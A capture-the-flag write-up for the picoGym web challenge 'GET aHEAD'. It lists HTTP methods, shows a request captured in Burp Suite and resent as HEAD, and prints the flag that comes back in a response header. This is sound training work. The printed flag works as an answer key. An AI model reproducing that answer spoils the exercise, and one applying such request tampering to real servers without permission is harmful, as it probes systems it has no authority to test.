# picoGym Level 132: GET aHEAD
Source: https://play.picoctf.org/practice/challenge/132

## Goal
Find the flag being held on this server to get ahead of the competition<br>
http://mercury.picoctf.net:15931/

## What I learned
```
Commonly Used
GET       Retrieve data from the server (safe, idempotent)
POST      Send data to the server (e.g., forms, uploads)
HEAD      Same as GET but only fetches headers (no body)
PUT       Replace a resource completely at the given URI
DELETE    Remove a resource
PATCH     Apply partial modifications to a resource
OPTIONS   Ask the server which methods are allowed (used for CORS preflight)

Less Common / Rare
TRACE     Echo back the request (used for diagnostics, but often disabled for security)
CONNECT   Establish a tunnel (commonly for HTTPS via proxies)
```

## Solution
```
https://webshell.picoctf.org/

# Burp Suite
Proxy (Open Browser)
Browser: http://mercury.picoctf.net:15931/ ⌨️
Proxy (Intercept on)

# Click Choose Blue/Red in Browser
POST👀 /index.php HTTP/1.1
Host: mercury.picoctf.net:15931
Content-Length: 0
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://mercury.picoctf.net:15931
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:15931/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

# Send Request to Repeater
# Modify GET to HEAD
HEAD /index.php? HTTP/1.1
Host: mercury.picoctf.net:15931
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:15931/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

# Response
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_82880908} 🔐
Content-type: text/html; charset=UTF-8
```

## Flag
picoCTF{r3j3ct_th3_du4l1ty_82880908}

## Continue
[Continue](./picoGym0278.md)